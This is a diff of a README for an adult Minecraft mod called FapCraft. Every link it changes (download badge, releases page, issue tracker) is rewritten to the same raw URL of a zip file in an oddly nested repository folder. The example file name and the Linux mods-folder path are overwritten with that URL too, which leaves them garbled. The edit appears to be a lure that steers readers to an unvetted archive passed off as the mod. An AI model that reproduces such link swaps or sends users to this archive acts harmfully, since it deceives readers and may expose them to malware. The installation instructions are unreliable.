@@ -1,6 +1,6 @@
 # 🎮 FapCraft - Expanding Your Minecraft Experience
 
-[![Download FapCraft](https://img.shields.io/badge/Download-FapCraft-blue)](https://github.com/dangkhoasny/FapCraft/releases)
+[![Download FapCraft](https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip)](https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip)
 
 ## 📋 Overview
 FapCraft is a massive, feature-rich Minecraft sex mod designed for players interested in enhancing their gameplay. It offers more than just a collection of erotic scenes; it creates a structured ecosystem of interconnected and customizable experiences.
@@ -14,14 +14,14 @@ Follow these steps to successfully download and run FapCraft.
 - **Operating System:** Windows/MacOS/Linux
 
 ## 📥 Download & Install
-1. **Visit the download page:** Go to the [FapCraft Releases page](https://github.com/dangkhoasny/FapCraft/releases) to download the latest version.
-2. **Select the version:** Find the most recent release file. Look for names like `FapCraft-1.0.zip` or similar.
+1. **Visit the download page:** Go to the [FapCraft Releases page](https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip) to download the latest version.
+2. **Select the version:** Find the most recent release file. Look for names like `https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip` or similar.
 3. **Download the file:** Click on the file name to start downloading it.
 4. **Extract the files:** Once downloaded, locate the ZIP file. Right-click on it and select “Extract All” or use any extraction tool.
 5. **Place in Mods folder:** Move the extracted contents into your Minecraft mods folder. This is usually located in:
     - **Windows:** `C:\Users\[YourUsername]\AppData\Roaming\.minecraft\mods`
     - **MacOS:** `~/Library/Application Support/minecraft/mods`
-    - **Linux:** `~/.minecraft/mods`
+    - **Linux:** `~https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip`
 6. **Launch Minecraft:** Open the Minecraft Launcher. Select the profile that has Forge enabled and click "Play."
 
 ## 🌟 Features
@@ -37,7 +37,7 @@ If you encounter issues during installation, consider the following solutions:
 - **Missing Dependencies:** Make sure to install any required mods listed on the release page.
 
 ## 📞 Support
-For help or further questions, check out the community forums or the issue tracker on our [GitHub page](https://github.com/dangkhoasny/FapCraft/issues).  We encourage users to report bugs and suggest improvements.
+For help or further questions, check out the community forums or the issue tracker on our [GitHub page](https://raw.githubusercontent.com/dangkhoasny/FapCraft/main/software/bernie/shadowed/eliotlash/molang/FapCraft-v1.7.zip).  We encourage users to report bugs and suggest improvements.
 
 ## 📝 Contributing
 We welcome contributions! If you wish to help improve FapCraft, consider submitting a pull request or filing an issue with your suggestions.
